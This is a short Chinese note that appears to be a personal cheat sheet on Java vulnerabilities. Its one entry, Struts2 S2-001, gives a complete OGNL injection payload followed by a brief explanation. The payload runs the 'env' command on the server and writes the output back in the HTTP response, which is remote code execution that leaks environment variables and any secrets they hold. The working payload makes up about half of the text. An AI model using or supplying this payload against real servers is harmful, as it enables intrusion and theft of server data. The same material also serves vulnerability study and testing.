# JAVA漏洞


### S2-001


playload ：

````

%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

````

<br>

解释:

<br>

这是一段针对 Struts2 框架的远程代码执行（RCE）攻击代码。该攻击利用了 Struts2 过滤器没有正确处理 OGNL 表达式中 #{} 情况的漏洞，导致攻击者可以在 HTTP 请求中注入任意代码，从而执行任意命令。
具体来说，这段代码会创建一个新的进程，并执行 "env" 命令，将结果输出到 InputStream 中。然后通过 BufferedReader 和 char 数组等方式读取 InputStream 中的内容，并将结果输出到 HttpServletResponse 中，最终返回给攻击者。


